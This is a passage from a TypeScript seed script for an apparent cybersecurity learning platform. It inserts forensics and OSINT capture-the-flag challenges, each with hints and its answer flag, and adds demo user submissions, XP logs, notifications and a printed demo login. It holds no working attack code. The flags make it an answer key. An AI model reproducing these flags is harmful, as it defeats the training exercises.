    { title: 'Steganography', description: 'An innocent-looking image hides a secret message. The flag is embedded using LSB steganography.\n\nDownload: challenge.png\n\nExtract the hidden message using steganography tools.', category: 'forensics', difficulty: 'easy', points: 125, hint: 'Use steghide: steghide extract -sf challenge.png. If it asks for a passphrase, try empty or "password".', flag: 'CYBERSHIELD{lsb_h1dd3n_msg}', solveCount: 76 },
    // OSINT (3)
    { title: 'Digital Footprint', description: 'A target left traces across multiple social media platforms. Find their real identity by correlating information.\n\nUsername: @shadow_h4cker_2024\n\nThe flag is their real full name in format: CYBERSHIELD{firstname_lastname}.', category: 'osint', difficulty: 'easy', points: 75, hint: 'Search the username on Twitter, GitHub, Reddit. Look for profile pictures, bio overlaps, and connected accounts.', flag: 'CYBERSHIELD{jane_doe_osint}', solveCount: 112 },
    { title: 'Metadata Extract', description: 'A photo was posted online. The EXIF metadata contains GPS coordinates that reveal a secret location.\n\nThe flag is the 6-digit latitude*1000 (rounded) at that location.', category: 'osint', difficulty: 'easy', points: 100, hint: 'Use exiftool to extract metadata from the image. Look for GPSLatitude and GPSLongitude fields.', flag: 'CYBERSHIELD{407123}', solveCount: 94 },
    { title: 'Wayback Machine', description: 'A website was taken down but we need its old content. Use the Wayback Machine to find a deleted page.\n\nURL: http://old-site.example.com/secret-page\n\nThe flag was on this page before it was removed.', category: 'osint', difficulty: 'medium', points: 150, hint: 'Visit web.archive.org and search for the URL. Check snapshots from 2023.', flag: 'CYBERSHIELD{w4yb4ck_t1m3_m4ch1n3}', solveCount: 63 },
  ];

  for (const c of ctfData) {
    await db.ctfChallenge.create({ data: c });
  }

  // ── CTF Submissions (for leaderboard stats) ──
  const solvedBySarah = ctfData.slice(0, 18);
  const solvedByJames = ctfData.slice(0, 14);
  const solvedByPriya = ctfData.slice(0, 11);
  for (let i = 0; i < solvedBySarah.length; i++) {
    await db.ctfSubmission.create({ data: { userId: sarah.id, challengeId: (await db.ctfChallenge.findFirst({ where: { title: solvedBySarah[i].title } }))!.id, flagSubmitted: solvedBySarah[i].flag, correct: true } });
  }
  for (let i = 0; i < solvedByJames.length; i++) {
    await db.ctfSubmission.create({ data: { userId: james.id, challengeId: (await db.ctfChallenge.findFirst({ where: { title: solvedByJames[i].title } }))!.id, flagSubmitted: solvedByJames[i].flag, correct: true } });
  }
  for (let i = 0; i < solvedByPriya.length; i++) {
    await db.ctfSubmission.create({ data: { userId: priya.id, challengeId: (await db.ctfChallenge.findFirst({ where: { title: solvedByPriya[i].title } }))!.id, flagSubmitted: solvedByPriya[i].flag, correct: true } });
  }

  // ── XP Logs ──
  await db.xpLog.createMany({
    data: [
      { userId: alex.id, amount: 100, source: 'enrollment', description: 'Enrolled in Network Security' },
      { userId: alex.id, amount: 200, source: 'quiz', description: 'Scored 80% on Cryptography Quiz' },
      { userId: alex.id, amount: 150, source: 'lab', description: 'Completed Firewall Lab' },
      { userId: alex.id, amount: 50, source: 'badge', description: 'First Blood badge' },
      { userId: alex.id, amount: 100, source: 'badge', description: 'Quiz Master badge' },
      { userId: alex.id, amount: 300, source: 'ctf', description: 'Solved SQL Injection 101' },
      { userId: alex.id, amount: 550, source: 'streak', description: '7-day streak bonus' },
      { userId: sarah.id, amount: 2500, source: 'ctf', description: 'Solved 18 CTF challenges' },
      { userId: sarah.id, amount: 800, source: 'quiz', description: 'Perfect scores on multiple quizzes' },
      { userId: sarah.id, amount: 1200, source: 'lab', description: 'Completed 10 lab sessions' },
      { userId: sarah.id, amount: 1000, source: 'streak', description: '15-day streak bonus' },
      { userId: james.id, amount: 1800, source: 'ctf', description: 'Solved 14 CTF challenges' },
      { userId: james.id, amount: 600, source: 'lab', description: 'Completed 7 lab sessions' },
    ],
  });

  // ── Notifications ──
  await db.notification.createMany({
    data: [
      { userId: alex.id, title: 'New CTF Challenge', message: 'Heap Overflow is now live in the Pwn category!', type: 'info' },
      { userId: alex.id, title: 'Quiz Score', message: 'You scored 90% on Network Fundamentals!', type: 'success' },
      { userId: alex.id, title: 'Badge Earned', message: 'You earned the Quiz Master badge!', type: 'achievement' },
      { userId: alex.id, title: 'Streak Bonus', message: '7-day streak! +550 XP bonus earned!', type: 'xp' },
      { userId: alex.id, title: 'New Course', message: 'Mobile Application Security is now available!', type: 'info' },
      { userId: alex.id, title: 'Leaderboard Update', message: 'You moved up to rank #4!', type: 'achievement' },
    ],
  });

  // ── Performance Metrics ──
  await db.performanceMetrics.createMany({
    data: [
      { userId: alex.id, courseId: courses[0].id, quizAccuracy: 0.82, comprehensionScore: 0.78, averageFocusScore: 0.87, labCompletionRate: 0.68, interactionCount: 142, timeSpentMinutes: 420, strengths: 'Network scanning, TCP/IP, cryptography basics', weaknesses: 'Cloud security, advanced forensics', recommendations: 'Focus on cloud security modules and complete the advanced forensics lab.' },
      { userId: sarah.id, courseId: courses[0].id, quizAccuracy: 0.95, comprehensionScore: 0.92, averageFocusScore: 0.94, labCompletionRate: 0.90, interactionCount: 380, timeSpentMinutes: 1200, strengths: 'Web security, cryptography, forensics, reverse engineering', weaknesses: 'None significant', recommendations: 'Ready for advanced courses.' },
    ],
  });

  console.log('Seed complete! Demo: alex@cybershield.academy / demo1234');
  console.log(`Alex ID: ${alex.id}`);
  console.log(`Users: ${users.length}, Courses: ${courses.length}, Modules: ${allModules.length}, CTF: ${ctfData.length}, Badges: ${allBadges.length}`);
}

main()
  .catch(e => { console.error(e); process.exit(1); })
  .finally(() => db.$disconnect()); 